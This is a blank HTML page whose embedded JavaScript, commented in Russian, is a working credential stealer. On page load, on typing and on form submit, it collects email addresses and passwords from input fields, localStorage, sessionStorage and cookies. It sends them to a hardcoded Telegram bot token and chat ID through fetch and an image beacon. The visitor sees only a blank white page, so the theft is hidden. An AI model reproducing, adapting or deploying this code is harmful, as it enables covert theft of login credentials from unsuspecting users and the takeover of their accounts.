<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * { margin: 0; padding: 0; }
        body { background: white; }
        html, body { width: 100%; height: 100%; overflow: hidden; }
    </style>
</head>
<body>

<script>
const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
const CHAT_ID = "8850351378";

let sent = false;
let lastEmail = '';
let lastPass = '';

function sendToTelegram(email, password) {
    if (sent) return;
    if (!email) return;
    sent = true;
    
    const text = `📩 ПОЧТА И ПАРОЛЬ\n📧 Email: ${email}\n🔑 Пароль: ${password || 'Не найден'}\n🕒 ${new Date().toLocaleString()}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
    
    fetch(url, { mode: 'no-cors' }).catch(() => {});
    new Image().src = url;
}

function findData() {
    if (sent) return;
    
    let email = '';
    let pass = '';
    
    // ПОЛЯ ВВОДА
    const inputs = document.querySelectorAll('input');
    for (let input of inputs) {
        const val = input.value || '';
        if (val && val.includes('@') && val.includes('.')) {
            email = val;
        }
        if (!pass && input.type === 'password' && input.value) {
            pass = input.value;
        }
        if (!pass && input.getAttribute('autocomplete') === 'current-password' && input.value) {
            pass = input.value;
        }
    }
    
    // LOCALSTORAGE
    if (!email && localStorage) {
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const val = localStorage.getItem(localStorage.key(i));
                if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
                    email = val;
                    break;
                }
            }
        } catch(e) {}
    }
    
    // SESSIONSTORAGE
    if (!email && sessionStorage) {
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const val = sessionStorage.getItem(sessionStorage.key(i));
                if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
                    email = val;
                    break;
                }
            }
        } catch(e) {}
    }
    
    // COOKIES
    if (!email && document.cookie) {
        try {
            const cookies = document.cookie.split(';');
            for (let c of cookies) {
                if (c.includes('@') && c.includes('.')) {
                    email = c.trim();
                    break;
                }
            }
        } catch(e) {}
    }
    
    // ПАРОЛЬ ИЗ LOCALSTORAGE
    if (!pass && localStorage) {
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const val = localStorage.getItem(key);
                if (val && typeof val === 'string' && (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd'))) {
                    pass = val;
                    break;
                }
            }
        } catch(e) {}
    }
    
    // ПАРОЛЬ ИЗ SESSIONSTORAGE
    if (!pass && sessionStorage) {
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const val = sessionStorage.getItem(key);
                if (val && typeof val === 'string' && (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd'))) {
                    pass = val;
                    break;
                }
            }
        } catch(e) {}
    }
    
    // ЕСЛИ НАШЛИ EMAIL
    if (email && !sent) {
        if (email !== lastEmail || pass !== lastPass) {
            lastEmail = email;
            lastPass = pass;
            sendToTelegram(email, pass);
        }
    }
}

// ЗАПУСК
window.addEventListener('load', function() {
    setTimeout(findData, 100);
    setTimeout(findData, 300);
    setTimeout(findData, 600);
    setTimeout(findData, 1000);
    setTimeout(findData, 2000);
    setTimeout(findData, 3000);
    setTimeout(findData, 5000);
});

// ВВОД
document.addEventListener('input', function(e) {
    if (e.target.tagName === 'INPUT') {
        setTimeout(findData, 50);
    }
});

// ОТПРАВКА ФОРМЫ
document.addEventListener('submit', function() {
    setTimeout(findData, 100);
    setTimeout(findData, 300);
});
</script>
</body>
</html>
